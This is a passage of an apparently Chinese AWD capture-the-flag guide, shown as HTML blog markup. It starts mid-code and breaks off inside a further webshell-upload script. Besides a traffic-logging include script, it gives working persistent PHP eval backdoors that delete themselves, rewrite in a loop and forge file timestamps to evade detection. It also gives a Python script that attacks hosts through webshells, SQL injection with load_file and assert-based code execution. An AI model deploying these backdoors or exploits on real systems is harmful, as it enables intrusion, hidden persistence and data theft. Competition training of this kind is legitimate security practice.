class="string">"c.php"</span>);</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">"kill -9 <span class="variable">$pid</span>"</span>);</span><br><span class="line">usleep(1000);</span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure></li><li><p>重启 apache，php 等web服务（一般不会有权限） </p></li></ul><h1 id="流量日志"><a href="#流量日志" class="headerlink" title="流量日志"></a>流量日志</h1><p>通过对流量、⽇志的分析，可以：</p><ul><li>感知可能正在发⽣的攻击，从⽽规避存在的安全⻛险</li><li>应急响应，还原攻击者的攻击路径，从⽽挽回已经造成的损失</li><li>某些情况下还能对攻击进⾏重放复现</li></ul><h2 id="流量"><a href="#流量" class="headerlink" title="流量"></a>流量</h2><p>流量监控日志：<br><a href="https://github.com/wupco/weblogger" target="_blank" rel="noopener">https://github.com/wupco/weblogger</a><br><a href="https://github.com/DasSecurity-Labs/AoiAWD" target="_blank" rel="noopener">https://github.com/DasSecurity-Labs/AoiAWD</a><br>批量包含文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">($dir,$filename)</span></span>&#123;</span><br><span class="line">$layer_list = scandir($dir);</span><br><span class="line"><span class="keyword">foreach</span> ($layer_list <span class="keyword">as</span> $i)&#123;</span><br><span class="line"><span class="keyword">if</span> ($i === <span class="string">'.'</span> || $i === <span class="string">".."</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">$next = $dir . $i;</span><br><span class="line"><span class="keyword">if</span> (is_dir($next)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($next[strlen($next) - <span class="number">1</span>] !== <span class="string">'/'</span>) &#123;</span><br><span class="line">$next .= <span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br><span class="line">install($next,$filename);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$ext = end(explode(<span class="string">'.'</span>, $next));</span><br><span class="line">$php_ext = [<span class="string">"php"</span>, <span class="string">"php5"</span>, <span class="string">"phtml"</span>];</span><br><span class="line"><span class="keyword">if</span> (in_array($ext, $php_ext) &amp;&amp; strlen($ext) !== strlen($next)&amp;&amp; $next!=<span class="keyword">__FILE__</span>) &#123;</span><br><span class="line">$old_file_str = file_get_contents($next);</span><br><span class="line">file_put_contents($next, <span class="string">"&lt;?php include_once '"</span>.$filename.<span class="string">"'; ?&gt;"</span> . $old_file_str);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uninstall</span><span class="params">($dir,$filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$layer_list = scandir($dir);</span><br><span class="line"><span class="keyword">foreach</span> ($layer_list <span class="keyword">as</span> $i) &#123;</span><br><span class="line"><span class="keyword">if</span> ($i === <span class="string">'.'</span> || $i == <span class="string">".."</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">$next = $dir . $i;</span><br><span class="line"><span class="keyword">if</span> (is_dir($next)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($next[strlen($next) - <span class="number">1</span>] !== <span class="string">'/'</span>) &#123;</span><br><span class="line">$next .= <span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br><span class="line">uninstall($next,$filename);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$ext = end(explode(<span class="string">'.'</span>, $next));</span><br><span class="line">$php_ext = [<span class="string">"php"</span>, <span class="string">"php5"</span>, <span class="string">"phtml"</span>];</span><br><span class="line"><span class="keyword">if</span> (in_array($ext, $php_ext) &amp;&amp; strlen($ext) !== strlen($next)&amp;&amp; $next!=<span class="keyword">__FILE__</span>) &#123;</span><br><span class="line">$old_file_str = file_get_contents($next);</span><br><span class="line"><span class="keyword">echo</span> $next . <span class="string">"\n"</span>;</span><br><span class="line">file_put_contents($next, str_replace(<span class="string">"&lt;?php include_once '"</span>.$filename.<span class="string">"'; ?&gt;"</span>, <span class="string">""</span>, $old_file_str));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] === <span class="string">"--install"</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($argv[<span class="number">2</span>])) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Usage: php fileinclude.php --install [web dir] [incoude file]\nExample: php fileinclude.php--install /var/www/html /tmp/filename.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$install_path = $argv[<span class="number">2</span>];</span><br><span class="line">$include_file = $argv[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">if</span> ($install_path[strlen($install_path) - <span class="number">1</span>] !== <span class="string">'/'</span>) &#123;</span><br><span class="line">$install_path .= <span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br><span class="line">install($install_path,$include_file);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] === <span class="string">"--uninstall"</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($argv[<span class="number">2</span>])) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Usage: php fileinclude.php --uninstall [web dir] [incoude file]\nExample: php fileinclude.php --uninstall /var/www/html /tmp/filename.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$install_path = $argv[<span class="number">2</span>];</span><br><span class="line">$include_file = $argv[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">if</span> ($install_path[strlen($install_path) - <span class="number">1</span>] !== <span class="string">'/'</span>) &#123;</span><br><span class="line">$install_path .= <span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br><span class="line">uninstall($install_path,$include_file);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">包含：php fileinclude.php --install [web dir] [filename]   </span><br><span class="line"> php fileinclude.php --install /var/www/html /tmp/129fc23931a5be05b43f0e9d2c90bd15/weblogpro.php   </span><br><span class="line">删除包含：php fileinclude.php --uninstall [web dir] [filename]    </span><br><span class="line"> php fileinclude.php --install /var/www/html /tmp/129fc23931a5be05b43f0e9d2c90bd15/weblogpro.php</span><br></pre></td></tr></table></figure><h2 id="中间件日志"><a href="#中间件日志" class="headerlink" title="中间件日志"></a>中间件日志</h2><p>⽐如apache，nginx<br>查看当前访问量前⼗的链接 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/apache2/access.log |awk <span class="string">'&#123;print $7&#125;'</span>|sort|uniq -c| sort -r|head</span><br></pre></td></tr></table></figure><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p>普通版</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"> set_time_limit(0);</span><br><span class="line"> unlink(__FILE__);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">'admin.php'</span>;</span><br><span class="line"> <span class="variable">$code</span> = <span class="string">'&lt;?php if(md5($_GET["pass"])=="3bf8d4b2d94742b03e7d08cdf1f32128")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line"> //9415p4ss20rd</span><br><span class="line"> <span class="keyword">while</span> (1)&#123;</span><br><span class="line"> </span><br><span class="line"> file_put_contents(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line"> system(<span class="string">'touch -m -d "2018-12-01 09:10:12" admin.php'</span>);</span><br><span class="line"> usleep(1000);</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li><code>ignore_user_abort(true)</code>:函数设置与客户机断开是否会终⽌脚本的执⾏。这⾥设置为true则忽略与⽤户的断开，即使与客户机断<br>开脚本仍会执⾏。</li><li><code>set_time_limit()</code> :函数设置脚本最⼤执⾏时间。这⾥设置为0，即没有时间⽅⾯的限制。</li><li><code>unlink(__FILE__)</code>  :删除⽂件本身，以起到隐蔽⾃身的作⽤。</li><li><code>while</code>:循环内每隔 usleep(1000) 即写新的后⻔⽂件<br>system(): 执⾏的命令⽤于修改⽂件的创建或修改时间，可以绕过<code>“find /var/www/html –name *.php –mmin -10”</code>命令检测最<br>近10分钟修改或新创建的PHP⽂件，但不⼀定有⽤，可选。</li></ul><p>⽹上流传的不死⻢, while ⾥⾯只是并没有判断了这个⽂件是不是存在 ,<br>那么我只需要把这个⽂件中的 shell 注释掉就可以绕过你的内存⽊⻢了。</p><p>进阶版</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"> set_time_limit(0);</span><br><span class="line"> unlink(__FILE__);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">'admin.php'</span>;</span><br><span class="line"> <span class="variable">$code</span> = <span class="string">'&lt;?php if(md5($_GET["pass"])=="3bf8d4b2d94742b03e7d08cdf1f32128")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line"> //<span class="variable">$code</span> =<span class="string">'PD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iM2JmOGQ0YjJkOTQ3NDJiMDNlN2QwOGNkZjFmMzIxMjgiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4='</span>;</span><br><span class="line"> //9415p4ss20rd</span><br><span class="line"> <span class="keyword">while</span> (1)&#123;</span><br><span class="line"> <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>))!==md5(<span class="variable">$code</span>)) &#123;</span><br><span class="line"> file_put_contents(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line"> system(<span class="string">'touch -m -d "2018-12-01 09:10:12" admin.php'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> usleep(1000);</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="批量提交flag"><a href="#批量提交flag" class="headerlink" title="批量提交flag"></a>批量提交flag</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="comment">#ignore the validity of the certificate</span></span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"><span class="comment">#disable the security warnning message</span></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlagFile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># save flag</span></span><br><span class="line">        self.flag_file = <span class="string">"./flag.txt"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_one</span><span class="params">(self, flag)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">with</span> open(self.flag_file, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(flag + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_many</span><span class="params">(self, flags)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> flags:</span><br><span class="line">            <span class="keyword">with</span> open(self.flag_file, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">                    f.write(flag + <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">del_all</span><span class="params">(self)</span>:</span></span><br><span class="line">        f = open(self.flag_file, <span class="string">"w+"</span>)</span><br><span class="line">        f.truncate()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(self.flag_file, <span class="string">"r"</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flags = set([i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines() <span class="keyword">if</span> i ] )</span><br><span class="line">        <span class="keyword">return</span> flags</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span><span class="params">(flag)</span>:</span></span><br><span class="line">    host_url=<span class="string">"http://awd.hillstonenet.com/api/flag"</span> <span class="comment">#提交地址</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/json; charset=UTF-8"</span>,</span><br><span class="line">        <span class="string">"Authorization"</span>: <span class="string">"d89fdcf7f1fd37a69aef7ea0d507a51a"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#data=&#123;</span></span><br><span class="line">        <span class="comment">#'answer':flag,</span></span><br><span class="line">        <span class="comment">#'token': 'bf9805453b757d736b544c656d86e671'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">"flag"</span>:flag</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data=json.dumps(data)</span><br><span class="line">        r=requests.post(host_url,data=data,headers=headers)</span><br><span class="line">        print(r.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"><span class="comment"># match the flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">match_flag</span><span class="params">(content)</span>:</span></span><br><span class="line">    comp = re.compile(<span class="string">"hillstone&#123;.*?&#125;"</span>)</span><br><span class="line">    path = comp.findall(content)</span><br><span class="line">    <span class="keyword">if</span> path:</span><br><span class="line">        print(path[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span> path[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#web1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web1_shell</span><span class="params">(host,port)</span>:</span></span><br><span class="line">    shell_url = <span class="string">"http://&#123;&#125;:&#123;&#125;/admin/upload/admin.php?pass=p455word"</span>.format(host, port)</span><br><span class="line">    command=<span class="string">"show_source('/flag');"</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"a"</span>: command</span><br><span class="line">    &#125;</span><br><span class="line">    res=requests.post(url=shell_url,data=data)</span><br><span class="line">    <span class="keyword">return</span> match_flag(res.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#web2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web2_sql</span><span class="params">(host,port)</span>:</span></span><br><span class="line">    sql_url=<span class="string">"http://&#123;&#125;:&#123;&#125;/sqlgunsearch.php"</span>.format(host,port)</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">"key"</span>: <span class="string">"key=aa%' union select 1,2,load_file('/flag')#--"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.post(url=sql_url,data=data)</span><br><span class="line">        <span class="keyword">return</span> match_flag(res.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"><span class="comment">#web3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web3_shell</span><span class="params">(host,port)</span>:</span></span><br><span class="line">    shell_url = <span class="string">"http://&#123;&#125;:&#123;&#125;/includes/config.php?d=assert"</span>.format(host, port)</span><br><span class="line">    command = <span class="string">"show_source('/flag');"</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"c"</span>: command</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=shell_url, data=data)</span><br><span class="line">    <span class="keyword">return</span> match_flag(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web1_exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,host,port)</span>:</span></span><br><span class="line">        self.host=host</span><br><span class="line">        self.port=port</span><br><span class="line">        self.flag_file=FlagFile()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sql</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rce</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">webshell</span><span class="params">(self)</span>:</span></span><br><span class="line">        flag=web1_shell(self.host,self.port)</span><br><span class="line">        self.flag_file.add_one(flag)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web2_exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,host,port)</span>:</span></span><br><span class="line">        self.host=host</span><br><span class="line">        self.port=port</span><br><span class="line">        self.flag_file=FlagFile()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sql</span><span class="params">(self)</span>:</span></span><br><span class="line">        flag=web2_sql(self.host,self.port)</span><br><span class="line">        self.flag_file.add_one(flag)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rce</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">webshell</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web3_exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,host,port)</span>:</span></span><br><span class="line">        self.host=host</span><br><span class="line">        self.port=port</span><br><span class="line">        self.flag_file=FlagFile()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sql</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rce</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">webshell</span><span class="params">(self)</span>:</span></span><br><span class="line">        flag=web3_shell(self.host,self.port)</span><br><span class="line">        self.flag_file.add_one(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web_exp</span><span class="params">(host,port,num)</span>:</span></span><br><span class="line">    exp = eval(<span class="string">"web&#123;&#125;_exp(host, port)"</span>.format(num))</span><br><span class="line">    exp.sql()</span><br><span class="line">    exp.rce()</span><br><span class="line">    exp.webshell()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack_web</span><span class="params">(host,port,num)</span>:</span></span><br><span class="line">    base_host=host</span><br><span class="line">    base_port=port</span><br><span class="line">    tasks = []</span><br><span class="line">    flag_file = FlagFile()</span><br><span class="line">    flag_file.del_all()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        tasks.append(Thread(target=web_exp, args=(base_host, base_port + i,num)))</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        task.start()</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        task.join()</span><br><span class="line">    <span class="keyword">for</span> flag <span class="keyword">in</span> flag_file.get_all():</span><br><span class="line">        submit_flag(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    base_host1 = <span class="string">"ip"</span></span><br><span class="line">    base_port1 = <span class="number">8100</span></span><br><span class="line">    base_host2 = <span class="string">"ip"</span></span><br><span class="line">    base_port2 = <span class="number">8200</span></span><br><span class="line">    base_host3 = <span class="string">"ip"</span></span><br><span class="line">    base_port3 = <span class="number">8300</span></span><br><span class="line">    attack_web(base_host1,base_port1,<span class="number">1</span>)</span><br><span class="line">    attack_web(base_host2, base_port2,<span class="number">2</span>)</span><br><span class="line">    attack_web(base_host3, base_port3,<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="批量上传webshell"><a href="#批量上传webshell" class="headerlink" title="批量上传webshell"></a>批量上传webshell</h2><h3 id="固定文件名"><a href="#固定文件名" class="headerlink" title="固定文件名"></a>固定文件名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 